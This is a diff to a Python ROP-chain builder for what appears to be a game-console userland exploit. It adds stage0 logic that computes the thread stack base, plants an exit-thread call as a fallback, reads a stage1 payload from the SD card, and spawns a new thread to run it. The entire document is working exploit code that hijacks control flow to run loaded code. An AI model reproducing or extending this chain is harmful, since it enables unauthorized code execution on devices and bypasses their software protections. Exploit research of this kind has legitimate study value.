@@ -4,6 +4,8 @@ include("macros.py")
 ###THUS IT CAN RUN WHENEVER THE ROP IS LAUNCHED, WHATEVER THE THREAD BASE STACK ADDRSS IS
 
 set_mem_offset(STAGE0_OFFSET)
+VALID_ADDRESS = HEAP_STAHED_DEST # we need a valid address to store result of createThread (unused)
+                                 # this location is used for jumping to stage0, it is unused after stage0 is reached
 STACK_BASE = HEAP_STAHED_DEST - 0x4 # we need a safe location to store the stack base address
 
 BYTES_READ_OFF = 0x20
@@ -14,6 +16,11 @@ begin_area(PARSE_LETTER_STACK_RETURN_OFFSET-4-STAGE0_OFFSET)
 mov_r11_to_r0() # get an address that depends on the stack base address, so we can compute the current thread stack base address
 add_r0(0x100000000 - R11_THREAD_BASE_ADDRESS_OFFSET) # sub 0xa08 to get the current thread base stack address
 store_r0(STACK_BASE) # store the current stack base address to a safe location
+
+#STORE EXIT_THREAD to STAGE1_DEST before trying to read the stage1 file
+store(SVC_EXIT_THREAD, STAGE1_DEST) # store exitthread where stage1 should be copied,
+                                    # then if the file can't be read, the thread dedicated to stage1 is closed
+                                    # if the file is read, then exit_thread is overwritten, stage1 is executed
 
 # MOUNT_SDMC
 make_ptr_to_r0(STACK_BASE, sdmc_string) # load the smdc_string ptr to r0 according to its offset and the stack base address
@@ -52,6 +59,15 @@ add_word(0xDEADC0DE)
 SET_LR(NOP)
 make_ptr_to_r0(STACK_BASE, CONTEXT_OFFSET) # load the file context ptr to r0
 add_word(FS_CLOSEFILE + 0x4)
+
+# Create new thread for stage1, since we can't really find a good stack address to store stage1
+# (there're all really close to the end of the memregion)
+SET_LR(POP_R4R5PC) # skip the two args after create_thread
+pop(r0=VALID_ADDRESS, r3=STAGE1_DEST) # r0=valid address to store unused value
+                                      # r3=thread stack pointer
+add_word(SVC_CREATE_THREAD)
+add_word(0x31) # thread priority
+add_word(0xFFFFFFFE) # -2 => execute thread on the default CPU
 
 
 # we can't store the strings at the end of the rop because of the parse function
